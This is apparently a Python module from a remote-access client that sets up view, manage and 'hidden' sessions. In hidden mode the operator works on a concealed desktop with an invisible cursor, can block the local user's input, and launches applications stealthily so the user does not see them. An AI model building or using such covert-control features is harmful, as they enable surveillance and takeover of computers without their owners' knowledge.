"""Session resource factory for remote connections."""
from __future__ import annotations

from typing import Any, Callable

import logging
import os

from remote_client.apps.launcher import launch_app
from remote_client.control.cursor_visibility import CursorVisibilityController
from remote_client.control.handlers import ControlHandler, StabilizedControlHandler
from remote_client.control.input_controller import InputController, NullInputController
from remote_client.media.audio import AudioTrack
from remote_client.media.screen import ScreenTrack
from remote_client.webrtc.client import SessionResources
from remote_client.windows.hidden_desktop import HiddenDesktopSession

logger = logging.getLogger(__name__)


def _normalize_mode(mode: str | None) -> str:
    if not mode:
        return "manage"
    value = str(mode).strip().lower()
    if value in {"view", "viewer", "readonly"}:
        return "view"
    if value in {"hidden", "hidden-manage", "hidden_manage", "hidden-desktop", "hidden_desktop"}:
        return "hidden"
    return "manage"


def _input_stabilizer_enabled() -> bool:
    value = os.getenv("RC_INPUT_STABILIZER", "1")
    return value.strip().lower() not in {"0", "false", "no", "off"}


def _audio_enabled() -> bool:
    value = os.getenv("RC_DISABLE_AUDIO", "")
    return value.strip().lower() not in {"1", "true", "yes", "on"}


def _launch_hidden_enabled() -> bool:
    value = os.getenv("RC_LAUNCH_HIDDEN", "1")
    return value.strip().lower() not in {"0", "false", "no", "off"}


def _build_control_handler(controller: InputController) -> ControlHandler:
    if _input_stabilizer_enabled():
        return StabilizedControlHandler(controller)
    return ControlHandler(controller)


def _compose_close(
    primary: Callable[[], None] | None,
    cursor_controller: CursorVisibilityController | None,
) -> Callable[[], None] | None:
    if not primary and not cursor_controller:
        return None

    def _close() -> None:
        if cursor_controller:
            cursor_controller.reset()
        if primary:
            primary()

    return _close


def build_session_resources(mode: str | None) -> SessionResources:
    """
    Build session resources based on the requested mode.
    
    Modes:
    - "view": Read-only viewing, no control
    - "manage": Full control with visible cursor
    - "hidden": Hidden desktop mode with:
        - Invisible operator cursor (asynchronous from client cursor)
        - Screen capture from hidden desktop only (user doesn't see operations)
        - Toggleable local input blocking
        - Stealth application launching
    
    Args:
        mode: Session mode string
        
    Returns:
        SessionResources configured for the mode
    """
    normalized = _normalize_mode(mode)
    cursor_controller = CursorVisibilityController()
    
    if normalized == "view":
        controller = NullInputController()
        screen_track = ScreenTrack()
        control_handler = ControlHandler(controller)
        media_tracks: list[Any] = [screen_track]
        if _audio_enabled():
            media_tracks.append(AudioTrack())

        def _set_stream_profile(
            profile: str | None,
            width: int | None,
            height: int | None,
            fps: int | None,
        ) -> None:
            for track in media_tracks:
                if hasattr(track, "set_profile"):
                    track.set_profile(profile, width, height, fps)

        return SessionResources(
            control_handler,
            media_tracks,
            close=_compose_close(None, cursor_controller),
            set_stream_profile=_set_stream_profile,
            set_cursor_visibility=cursor_controller.set_visible,
        )
    
    if normalized == "hidden":
        try:
            hidden_session = HiddenDesktopSession()
        except Exception as exc:
            logger.warning("Hidden desktop session unavailable: %s", exc)
        else:
            controller = hidden_session.input_controller
            control_handler = _build_control_handler(controller)
            media_tracks: list[Any] = [hidden_session.screen_track]
            if _audio_enabled():
                media_tracks.append(AudioTrack())

            def _set_stream_profile(
                profile: str | None,
                width: int | None,
                height: int | None,
                fps: int | None,
            ) -> None:
                hidden_session.screen_track.set_profile(profile, width, height, fps)
            
            def _launch_app_hidden(app_name: str) -> None:
                """Launch application on hidden desktop (invisible to user)."""
                hidden_session.launch_application(app_name)
            
            def _set_input_blocking(enabled: bool) -> bool:
                """Toggle local input blocking (switchable module)."""
                return hidden_session.set_input_blocking(enabled)
            
            def _get_input_blocked() -> bool:
                """Check if local input is currently blocked."""
                return hidden_session.is_input_blocked

            return SessionResources(
                control_handler,
                media_tracks,
                close=hidden_session.close,
                set_stream_profile=_set_stream_profile,
                launch_app=_launch_app_hidden,
                set_input_blocking=_set_input_blocking,
                get_input_blocked=_get_input_blocked,
                # Note: cursor visibility is not applicable in hidden mode
                # as the operator cursor is always invisible to the client
            )

    # Default "manage" mode
    controller = InputController()
    screen_track = ScreenTrack(draw_cursor=False)
    control_handler = _build_control_handler(controller)
    media_tracks: list[Any] = [screen_track]
    if _audio_enabled():
        media_tracks.append(AudioTrack())

    def _launch_app(app_name: str) -> None:
        launch_app(app_name, hidden=_launch_hidden_enabled())

    def _set_stream_profile(
        profile: str | None,
        width: int | None,
        height: int | None,
        fps: int | None,
    ) -> None:
        for track in media_tracks:
            if hasattr(track, "set_profile"):
                track.set_profile(profile, width, height, fps)

    return SessionResources(
        control_handler,
        media_tracks,
        close=_compose_close(None, cursor_controller),
        launch_app=_launch_app,
        set_stream_profile=_set_stream_profile,
        set_cursor_visibility=cursor_controller.set_visible,
    )
